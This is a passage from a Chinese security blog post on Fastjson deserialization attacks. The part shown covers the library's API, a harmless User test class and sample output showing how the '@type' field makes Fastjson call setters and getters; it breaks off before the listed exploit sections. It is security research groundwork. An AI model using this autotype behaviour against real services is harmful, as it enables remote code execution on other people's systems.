<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Fastjson反序列化攻击 - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="FastJson API介绍 FastJson的常见API如下所示： JSON.toJSONString(Object)：将对象序列化成JSON字符串； JSON"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.98.0 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Fastjson反序列化攻击"><meta property="og:description" content="FastJson API介绍 FastJson的常见API如下所示： JSON.toJSONString(Object)：将对象序列化成JSON字符串； JSON"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-07-04T17:07:36+08:00"><meta property="article:modified_time" content="2021-07-04T17:07:36+08:00"><meta itemprop=name content="Fastjson反序列化攻击"><meta itemprop=description content="FastJson API介绍 FastJson的常见API如下所示： JSON.toJSONString(Object)：将对象序列化成JSON字符串； JSON"><meta itemprop=datePublished content="2021-07-04T17:07:36+08:00"><meta itemprop=dateModified content="2021-07-04T17:07:36+08:00"><meta itemprop=wordCount content="11328"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Fastjson反序列化攻击"><meta name=twitter:description content="FastJson API介绍 FastJson的常见API如下所示： JSON.toJSONString(Object)：将对象序列化成JSON字符串； JSON"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
<span></span>
<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Fastjson反序列化攻击</h1><div class=post-meta><span class=post-time>2021-07-04</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 11328 字</span>
<span class=more-meta>预计阅读 23 分钟</span>
<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#fastjson-api介绍>FastJson API介绍</a></li><li><a href=#fastjson测试>FastJson测试</a></li><li><a href=#fastjson反序列化exp分析>FastJson反序列化EXP分析</a><ul><li><a href=#version--1224>Version &lt;= 1.2.24</a></li><li><a href=#1225--version--1241>1.2.25 &lt;= Version &lt;= 1.2.41</a></li><li><a href=#version-1242>Version 1.2.42</a></li><li><a href=#version-1243>Version 1.2.43</a></li><li><a href=#1244--version--1245>1.2.44 &lt;= Version &lt;= 1.2.45</a></li><li><a href=#1246--version--1247>1.2.46 &lt;= Version &lt;= 1.2.47</a></li><li><a href=#1248--version--1268>1.2.48 &lt;= Version &lt;= 1.2.68</a></li><li><a href=#version-1268>Version 1.2.68</a></li></ul></li><li><a href=#总结-1>总结</a></li><li><a href=#流量特征>流量特征</a></li><li><a href=#参考>参考</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=fastjson-api介绍>FastJson API介绍</h2><p>FastJson的常见API如下所示：</p><ul><li>JSON.toJSONString(Object)：将对象序列化成JSON字符串；</li><li>JSON.parse(String)：将JSON字符换反序列化成Object对象；</li><li>JSON.parseObject(String)：将JSON字符串反序列化成JSONObject对象；</li><li>JSON.parseObject(String, Class)：将JSON字符串反序列化成Class实参对应的类对象；</li></ul><h2 id=fastjson测试>FastJson测试</h2><p>先说结论，便于理解（FastJson Version &lt;= 1.2.24）：</p><ul><li>FastJson会根据 <code>@type</code> 指定的类去进行反序列化；</li><li>FastJson反序列化过程中，会调用反序列化对象的setter方法进行赋值，并且如果属性是public权限，没有setter方法，也会被赋值；</li><li>FastJson默认不会反序列化private权限的属性，除非指定开启 <code>Feature.SupportNonPublicField</code> 特性；</li></ul><p>首先准备一个Java POJO，需要注意，以下的测试均基于FastJson Version 1.2.10：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/2 13:13
</span></span></span><span class=line><span class=cl><span class=cm> * 一个简单的用于测试FastJson反序列化的pojo
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>User</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * 私有属性，有getter&amp;setter方法
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=n>String</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * 共有属性，无getter&amp;setter方法
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>int</span> <span class=n>age</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * 私有属性，无getter&amp;setter方法
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=n>String</span> <span class=n>info</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * 公有属性，有getter&amp;setter方法
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=n>address</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=nf>User</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;call User default Constructor&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>getName</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;call User getName&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setName</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;call User setName&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>name</span> <span class=o>=</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>getAddress</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;call User getAddress&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>address</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setAddress</span><span class=o>(</span><span class=n>String</span> <span class=n>address</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;call User setAddress&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>address</span> <span class=o>=</span> <span class=n>address</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>toString</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s>&#34;User{&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;name=&#39;&#34;</span> <span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=sc>&#39;\&#39;&#39;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;, age=&#34;</span> <span class=o>+</span> <span class=n>age</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;, address=&#39;&#34;</span> <span class=o>+</span> <span class=n>address</span> <span class=o>+</span> <span class=sc>&#39;\&#39;&#39;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;, info=&#39;&#34;</span> <span class=o>+</span> <span class=n>info</span> <span class=o>+</span> <span class=sc>&#39;\&#39;&#39;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=sc>&#39;}&#39;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后运行如下测试代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/2 13:16
</span></span></span><span class=line><span class=cl><span class=cm> * 测试FastJson反序列化的逻辑
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Main</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//序列化
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>String</span> <span class=n>jsonString</span> <span class=o>=</span> <span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.pinger.javasec.fastjson.User\&#34;,\&#34;name\&#34;:\&#34;pinger\&#34;,\&#34;address\&#34;:\&#34;QT\&#34;,\&#34;info\&#34;:\&#34;QT Security Researcher\&#34;,\&#34;age\&#34;:\&#34;3\&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;jsonString=&#34;</span> <span class=o>+</span> <span class=n>jsonString</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;-----------------------------------------------\n\n&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//通过parse方法进行反序列化，返回的是@type指定的类对象
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;JSON.parse(String)：&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>obj1</span> <span class=o>=</span> <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>jsonString</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parse反序列化对象名称:&#34;</span> <span class=o>+</span> <span class=n>obj1</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parse反序列化：&#34;</span> <span class=o>+</span> <span class=n>obj1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;-----------------------------------------------\n&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//通过parseObject,不指定类，返回的是一个JSONObject
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;JSON.parseObject(String)：&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>obj2</span> <span class=o>=</span> <span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>jsonString</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化对象名称:&#34;</span> <span class=o>+</span> <span class=n>obj2</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化:&#34;</span> <span class=o>+</span> <span class=n>obj2</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;-----------------------------------------------\n&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//通过parseObject,指定为object.class
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;JSON.parseObject(String, Class)：&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>obj3</span> <span class=o>=</span> <span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>jsonString</span><span class=o>,</span> <span class=n>Object</span><span class=o>.</span><span class=na>class</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化对象名称:&#34;</span> <span class=o>+</span> <span class=n>obj3</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化:&#34;</span> <span class=o>+</span> <span class=n>obj3</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;-----------------------------------------------\n&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//通过parseObject,指定为User.class
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;JSON.parseObject(String, Class)：&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>obj4</span> <span class=o>=</span> <span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>jsonString</span><span class=o>,</span> <span class=n>User</span><span class=o>.</span><span class=na>class</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化对象名称:&#34;</span> <span class=o>+</span> <span class=n>obj4</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;parseObject反序列化:&#34;</span> <span class=o>+</span> <span class=n>obj4</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;-----------------------------------------------\n&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>得到如下运行结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>jsonString</span><span class=o>={</span><span class=s>&#34;@type&#34;</span><span class=o>:</span><span class=s>&#34;com.pinger.javasec.fastjson.User&#34;</span><span class=o>,</span><span class=s>&#34;name&#34;</span><span class=o>:</span><span class=s>&#34;pinger&#34;</span><span class=o>,</span><span class=s>&#34;address&#34;</span><span class=o>:</span><span class=s>&#34;QT&#34;</span><span class=o>,</span><span class=s>&#34;info&#34;</span><span class=o>:</span><span class=s>&#34;QT Security Researcher&#34;</span><span class=o>,</span><span class=s>&#34;age&#34;</span><span class=o>:</span><span class=s>&#34;3&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>String</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=nl>parse反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
</span></span><span class=line><span class=cl><span class=n>parse反序列化</span><span class=err>：</span><span class=n>User</span><span class=o>{</span><span class=n>name</span><span class=o>=</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>age</span><span class=o>=</span><span class=n>3</span><span class=o>,</span> <span class=n>address</span><span class=o>=</span><span class=err>&#39;</span><span class=n>QT</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>info</span><span class=o>=</span><span class=err>&#39;</span><span class=kc>null</span><span class=err>&#39;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>String</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>getAddress</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>getName</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>alibaba</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>JSONObject</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化:</span><span class=o>{</span><span class=s>&#34;name&#34;</span><span class=o>:</span><span class=s>&#34;pinger&#34;</span><span class=o>,</span><span class=s>&#34;age&#34;</span><span class=o>:</span><span class=n>3</span><span class=o>,</span><span class=s>&#34;address&#34;</span><span class=o>:</span><span class=s>&#34;QT&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>String</span><span class=o>,</span> <span class=n>Class</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化:</span><span class=n>User</span><span class=o>{</span><span class=n>name</span><span class=o>=</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>age</span><span class=o>=</span><span class=n>3</span><span class=o>,</span> <span class=n>address</span><span class=o>=</span><span class=err>&#39;</span><span class=n>QT</span><span class=err>&#39;</span><span class=o>,</span> <span class=n>info</span><span class=o>=</span><span class=err>&#39;</span><span class=kc>null</span><span class=err>&#39;</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>String</span><span class=o>,</span> <span class=n>Class</span><span class=o>)</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=k>default</span> <span class=n>Constructor</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setName</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=n>User</span> <span class=n>setAddress</span>
</span></span><span class=line><span class=cl><span class=nl>parseObject反序列化对象名称:</span><span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>fastjson</span><span class=o>.</span><span class=na>User</span>
